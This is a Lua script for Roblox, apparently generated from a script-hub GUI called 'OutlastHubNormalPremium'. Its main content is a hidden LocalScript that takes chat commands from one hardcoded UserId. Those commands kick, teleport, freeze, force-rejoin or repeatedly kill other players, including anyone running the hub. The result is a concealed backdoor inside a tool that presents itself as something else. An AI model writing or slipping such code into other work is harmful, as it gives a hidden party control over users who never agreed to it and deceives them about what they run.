local function SYWHN_fake_script() -- OutlastHubNormalPremium_2.Frame_2.g 
	local script = Instance.new('LocalScript', OutlastHubNormalPremium_2.Frame_2)

	local Players = game:GetService("Players")
	local TeleportService = game:GetService("TeleportService")
	
	-- Admins
	local Admins = {
		[11303503289] = true,
	}
	
	-- Loop reset storage (keyed by UserId)
	local LoopReset = {}
	
	-- =========================
	-- UTILS
	-- =========================
	local function findPlayer(name)
		name = name:lower()
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr.Name:lower():sub(1, #name) == name
				or plr.DisplayName:lower():sub(1, #name) == name then
				return plr
			end
		end
	end
	
	local function getTargets(speaker, name)
		if not name then return {} end
		if name == "all" then
			local t = {}
			for _, plr in ipairs(Players:GetPlayers()) do
				if plr ~= speaker then
					table.insert(t, plr)
				end
			end
			return t
		end
		local p = findPlayer(name)
		return p and { p } or {}
	end
	
	-- =========================
	-- COMMAND HANDLER
	-- =========================
	local function handleCommand(admin, cmd, targetNames, extra)
		if not Admins[admin.UserId] then return end
	
		local targets = {}
		for _, name in ipairs(targetNames or {}) do
			for _, t in ipairs(getTargets(admin, name)) do
				table.insert(targets, t)
			end
		end
	
		if #targets == 0 then return end
	
		cmd = cmd:lower() -- make command check case-insensitive
	
		if cmd == "kick" then
			for _, target in ipairs(targets) do
				if not Admins[target.UserId] then
					target:Kick(extra or "")
				end
			end
	
		elseif cmd == "bring" then
			local hrp = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
			for _, target in ipairs(targets) do
				local thrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
				if thrp then
					thrp.CFrame = hrp.CFrame
				end
			end
	
		elseif cmd == "to" then
			local hrp = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
			for _, target in ipairs(targets) do
				local thrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
				if thrp then
					hrp.CFrame = thrp.CFrame * CFrame.new(0, 0, 3)
				end
			end
	
		elseif cmd == "loopreset" then
			for _, target in ipairs(targets) do
				local uid = target.UserId
				if LoopReset[uid] then
					LoopReset[uid]:Disconnect()
					LoopReset[uid] = nil
				else
					LoopReset[uid] = target.CharacterAdded:Connect(function(char)
						task.wait(0.1)
						local hum = char:FindFirstChildOfClass("Humanoid")
						if hum then hum.Health = 0 end
					end)
					if target.Character then
						local hum = target.Character:FindFirstChildOfClass("Humanoid")
						if hum then hum.Health = 0 end
					end
				end
			end
	
		elseif cmd == "forcerejoin" then
			for _, target in ipairs(targets) do
				if target ~= admin then
					TeleportService:Teleport(game.PlaceId, target)
					
					if admin  then
						return
					end
				end
			end
	
		elseif cmd == "freeze" then
			for _, target in ipairs(targets) do
				local thrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
				if thrp then thrp.Anchored = true end
			end
	
		elseif cmd == "unfreeze" then
			for _, target in ipairs(targets) do
				local thrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
				if thrp then thrp.Anchored = false end
			end
		end
	end
	
	
	local function setupChatCommands(player)
		if not Admins[player.UserId] then return end
		player.Chatted:Connect(function(msg)
			local args = msg:split(" ")
			local cmd = table.remove(args, 1)
			if cmd:sub(1,1) == "!" then
				cmd = cmd:sub(2) 
			end
			handleCommand(player, cmd, args)
		end)
	end
	
	for _, player in ipairs(Players:GetPlayers()) do
		setupChatCommands(player)
	end
	
	-- Setup for new players
	Players.PlayerAdded:Connect(setupChatCommands)
	
end
coroutine.wrap(SYWHN_fake_script)()
